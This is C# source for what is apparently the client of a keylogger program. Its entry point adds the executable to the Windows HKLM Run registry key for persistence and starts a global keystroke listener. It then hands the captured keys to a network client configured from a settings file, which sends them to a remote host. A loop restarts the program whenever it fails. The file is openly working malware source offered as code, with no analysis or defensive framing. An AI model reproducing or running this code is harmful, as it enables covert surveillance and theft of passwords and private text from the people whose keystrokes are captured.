using Microsoft.Extensions.Logging;
using Microsoft.Win32;
using NKeyLoggerClient;
using NKeyLoggerLib;
class Program
{
    private static string settingsPath = "settings.txt";
    private static void RegApp()
    {
        RegistryKey registry = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\");
        string appName = System.AppDomain.CurrentDomain.FriendlyName + ".exe";
        string fullPathToThisApp = Directory.GetCurrentDirectory() + "\\" + appName;
        string? existValue = (string?)Registry.LocalMachine
            .OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\").GetValue(appName);
        if (existValue is null)
            registry.SetValue(appName, fullPathToThisApp);
    }
    public static void Main(string[] args)
    {
    again:
        try
        {
            RegApp();
            Setting setting = new Setting(settingsPath);
            Task<bool> listenTask = KeyListener.Instance.listenAsync();
            KeyListener.Instance.sender = new NetworkClient(setting);
            AppDomain.CurrentDomain.ProcessExit += (object? sender, EventArgs e) =>
            {
                KeyListener.Instance.stopListenAsync().Wait();
                NetworkClient? client = KeyListener.Instance.sender as NetworkClient;
                if (client != null)
                    client.Dispose();
                setting.Dispose();
            };
            listenTask.Wait();
        }
        catch (Exception ex)
        {
            Log<Program>.Instance.logger?.LogError($"Error: {ex.Message}");
            goto again;
        }
    }
}

